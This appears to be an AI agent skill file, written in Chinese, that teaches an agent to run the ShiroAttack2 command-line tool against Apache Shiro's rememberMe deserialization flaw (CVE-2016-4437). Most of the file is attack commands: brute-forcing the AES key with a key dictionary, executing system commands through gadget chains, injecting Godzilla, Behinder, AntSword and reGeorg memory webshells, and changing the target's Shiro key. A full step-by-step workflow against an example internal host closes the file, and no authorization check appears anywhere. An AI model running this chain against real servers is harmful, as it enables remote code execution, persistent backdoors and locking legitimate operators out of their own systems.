---
name: shiro-attack-cli
description: 当用户要求利用、检测或测试 Apache Shiro rememberMe 反序列化漏洞 (Shiro-550, CVE-2016-4437) 时使用。触发词包括 "Shiro"、"rememberMe"、"shiro attack"、"CVE-2016-4437"、"Shiro-550"、"爆破 Shiro key"、"利用 Shiro"、"Shiro 漏洞"。覆盖单目标探测、密钥爆破、Gadget 链自动检测、命令执行、内存马注入和 Key 修改。
user-invocable: false
---

# ShiroAttack2 CLI

Shiro-550 漏洞利用命令行工具，从 fat JAR 直接运行，无需 GUI。

## 启动方式

```bash
JAR="shiro_attack-5.1.1-all.jar"
CP="com.summersec.attack.CLI.MainCLI"
java -cp $JAR $CP <命令> [选项]
```

## 准备工作

### 下载 JAR

如果本地没有 jar，从 GitHub Releases 下载：

```bash
# 查看最新版本
curl -s https://api.github.com/repos/SummerSec/ShiroAttack2/releases/latest \
  | grep browser_download_url | grep all.jar | cut -d '"' -f 4

# 或用浏览器打开 https://github.com/SummerSec/ShiroAttack2/releases
# 下载 shiro_attack-*-all.jar 即可
```

### 准备 Key 字典

`crack` 命令需要 `data/shiro_keys.txt`。如果文件不存在，从 GitHub 下载：

```bash
mkdir -p data
curl -L -o data/shiro_keys.txt \
  https://raw.githubusercontent.com/SummerSec/ShiroAttack2/master/data/shiro_keys.txt
```

`data/` 目录需放在运行 jar 的工作目录下。

## 命令

### detect — 探测 Shiro

```bash
java -cp $JAR $CP detect -u <url> [-k <关键词>] [--cbc|--gcm] [--proxy <url>] [--timeout <秒>]
```

成功输出：`[++] 存在shiro框架！`

### crack — 爆破/验证 Key

```bash
# 字典爆破（工作目录需有 data/shiro_keys.txt）
java -cp $JAR $CP crack -u <url> [--cbc|--gcm]

# 验证指定 Key
java -cp $JAR $CP crack -u <url> -K <base64_key> [--cbc|--gcm]
```

### exec — 执行系统命令

```bash
java -cp $JAR $CP exec -u <url> -K <base64_key> -c <命令> [--cbc|--gcm] [-g <gadget>] [-e <回显>] [--json]
```

- `-K` : Shiro AES Key (Base64)。必需。
- `-c` : 要执行的系统命令。必需。
- `-g` : Gadget 链类名。省略则自动探测（优先无 commons-collections 依赖的变体）。
- `-e` : 回显类型：`AllEcho`（默认）、`TomcatEcho`、`SpringEcho`。

### memshell — 注入内存马

```bash
java -cp $JAR $CP memshell -u <url> -K <base64_key> -t <类型> [--pass <密码>] [--path <路径>] [--cbc|--gcm]
```

- `-t` : 内存马类型。必需。可选：`哥斯拉[Filter]`、`哥斯拉[Servlet]`、`冰蝎[Filter]`、`冰蝎[Servlet]`、`蚁剑[Filter]`、`蚁剑[Servlet]`、`NeoreGeorg[Filter]`、`NeoreGeorg[Servlet]`、`reGeorg[Filter]`、`reGeorg[Servlet]`
- `--pass` : 内存马连接密码，默认 `passwd`
- `--path` : 内存马 URL 路径，默认 `/favicon.ico`

### changekey — 修改目标 Shiro Key

```bash
java -cp $JAR $CP changekey -u <url> -K <当前key> --newkey <新key> [--variant <变体>] [--cbc|--gcm]
```

- `--newkey` : 新的 Shiro AES Key (Base64)。必需。
- `--variant` : 注入路径变体，默认 `filterConfigs -> shiroFilterFactoryBean`。可选：`filterConfigs -> shiroFilterFactoryBean`、`getFilterRegistration -> shiroFilterFactoryBean`、`filterConfigs -> 常见 Shiro 名依次匹配`、`getFilterRegistration -> 常见 Shiro 名依次匹配`、`filterConfigs -> 包含 shiro 的名称扫描`、`高风险: 全候选 rememberMeManager 扫描`

### gui — 启动图形界面

```bash
java -cp $JAR $CP gui
```

## AES 模式

| Shiro 版本 | 选项 |
|-----------|------|
| ≤ 1.2.4 | `--cbc` |
| ≥ 1.2.5 | `--gcm` |

## JSON 输出

使用 `--json` 时日志行输出为结构化 JSON，命令执行结果仍以原始文本打印。

```json
{"level":"info","msg":"[++] 存在shiro框架！"}
{"level":"success","msg":"[++] 找到key：kPH+bIxk5D2deZiIxcaaaA=="}
{"level":"info","msg":"[++] 发现构造链:CommonsBeanutilsString_183  回显方式: AllEcho"}
```

## 常见错误

- `[-] 响应含 rememberMe=deleteMe` : Key 正确但反序列化失败，尝试更换 Gadget/回显组合或检查 AES 模式
- `[-] 未发现shiro框架` : 目标无 Shiro 或 Cookie 关键词不匹配，尝试 `-k` 修改关键词
- `[-] 测试:xxx -> 响应含 rememberMe=deleteMe` : 该组合未命中，自动探测继续
- `[-] 利用链与回显全部测试完毕，未发现可用组合` : 所有链均失败，目标可能缺少必需依赖

## 完整流程示例

```bash
JAR="shiro_attack-5.1.1-all.jar"
CP="com.summersec.attack.CLI.MainCLI"
T="http://192.168.1.100:8080"

# 1. 探测 Shiro
java -cp $JAR $CP detect -u $T --cbc

# 2. 爆破 Key
java -cp $JAR $CP crack -u $T --cbc

# 3. 执行命令
java -cp $JAR $CP exec -u $T -K "kPH+bIxk5D2deZiIxcaaaA==" -c "whoami" --cbc

# 4. 注入内存马
java -cp $JAR $CP memshell -u $T -K "kPH+bIxk5D2deZiIxcaaaA==" -t 哥斯拉[Filter] --pass mypass

# 5. 修改 Shiro Key
java -cp $JAR $CP changekey -u $T -K "kPH+bIxk5D2deZiIxcaaaA==" --newkey "FcoRsBKe9XB3zOHbxTG0Lw=="
```
